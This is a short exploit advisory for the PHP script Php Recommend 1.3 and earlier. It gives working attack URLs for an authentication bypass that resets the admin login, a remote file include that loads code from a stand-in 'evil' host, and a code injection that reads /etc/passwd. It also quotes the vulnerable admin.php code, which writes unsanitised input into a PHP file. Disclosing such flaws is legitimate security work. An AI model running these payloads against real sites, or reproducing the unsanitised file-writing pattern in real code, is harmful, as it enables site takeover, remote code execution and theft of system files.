Php Recommend <= 1.3 (AB/RFI/CI) Multiple Remote Vulnerabilities
================================================================


Php Recommend <=1.3 Authentication Bypass/Remote File Include/Code Injection Exploits


Author: scriptjunkie  scriptjunkie.1 {nospam} googlemail {nospam} com
Condition: RFI:  allow_url_fopen = On
code injection: magic_quotes_gpc = Off

Exploits:
Authentication Bypass:
change admin username and password:
vulnerable.com/admin.php?submit=submit&form_admin_user=USERNAME&form_admin_pass=PASSWORD

RFI:
vulnerable.com/admin.php?submit=submit&form_include_template=http://evil/evil.php

Code Injection:
vulnerable.com/admin.php?submit=submit&form_aula=&#039;;readfile(&#039;/etc/passwd&#039;);&#039;


Vulnerable code in "admin.php":

if($submit){
$a = "&#039;";
$b = "<";
$c = ">";
$d = "";
$content = "".$b."?php
// Php Recommmend
// Created By Frax.dk
// GNU Licens
// Please do not delete this text
$".$d."page = &#039;".$form_page."&#039;;
$".$d."include_template = &#039;".$form_include_template."&#039;;
$".$d."cap = &#039;".$form_cap."&#039;;
$".$d."title = &#039;".$form_title."&#039;;
$".$d."aula = &#039;".$form_aula."&#039;;
$".$d."language = &#039;".$form_language."&#039;;
$".$d."admin_user = &#039;".$form_admin_user."&#039;;
$".$d."admin_pass = &#039;".$form_admin_pass."&#039;;

// -- Maincore -- //

include $".$d."include_template;
?".$c."";

$file = $file_name;
$create_file = fopen($file, "w+");

if(!$create_file){die("<td><span style=&#039;color:red;&#039;><? echo $error1; ?></span></td>\n");}

//attempt to write basic content to the file
if (fwrite($create_file, $content) === FALSE) {
echo "<td><span style=&#039;color:red;&#039;><? echo $error2; ?></span></td>\n";
}else{echo "Succes";}
fclose($create_file);


which is reached since the authentication in server.php:
if($user == $admin_user && $admin_pass == $pass){
$error = "false";
}else{
$error = "true";
}

is not checked sufficiently.



